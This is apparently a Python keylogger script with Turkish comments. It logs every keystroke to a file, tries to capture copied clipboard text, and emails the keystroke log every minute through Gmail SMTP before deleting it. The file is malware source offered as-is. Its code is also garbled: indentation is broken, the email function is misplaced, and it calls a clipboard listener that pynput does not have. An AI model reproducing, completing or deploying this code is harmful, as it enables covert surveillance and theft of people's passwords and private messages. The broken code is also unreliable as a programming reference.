import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput import keyboard
from pynput import clipboard
import os
import time
import schedule

SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_password"
RECIPIENT_EMAIL = "recipient_email@gmail.com"

tuş_sayıları = {}

kopyalanan_metinler = open("kopyalanan_metinler.txt", "a")

def on_press(key) :
    try :
    tuş = key.char  # Normal karakter tuşları
    except AttributeError :
tuş = str(key)  # Diğer tuşlar(Shift, Ctrl, vs.)

if tuş in tuş_sayıları :
tuş_sayıları[tuş] += 1
else:
tuş_sayıları[tuş] = 1

with open("basılan_tuşlar.txt", "a") as dosya :
dosya.write(f"{tuş}\n")

def on_copy(text) :
    kopyalanan_metinler.write(text + "\n")

    # E - posta gönderme fonksiyonu
    def send_email() :
    # E - posta oluşturma
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECIPIENT_EMAIL
    msg['Subject'] = "Kullanıcı Aktiviteleri"

    # Metin belgesini e - posta içeriğine ekleme
    with open("basılan_tuşlar.txt", "r") as dosya :
text = dosya.read()
body = MIMEText(text)
msg.attach(body)

with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server :
server.starttls()
server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
server.send_message(msg)

os.remove("basılan_tuşlar.txt")

schedule.every(1).minutes.do(send_email)

with keyboard.Listener(on_press = on_press) as listener1, clipboard.Listener(on_copy = on_copy) as listener2 :
listener1.join()
listener2.join()

while True:
schedule.run_pending()
time.sleep(1)
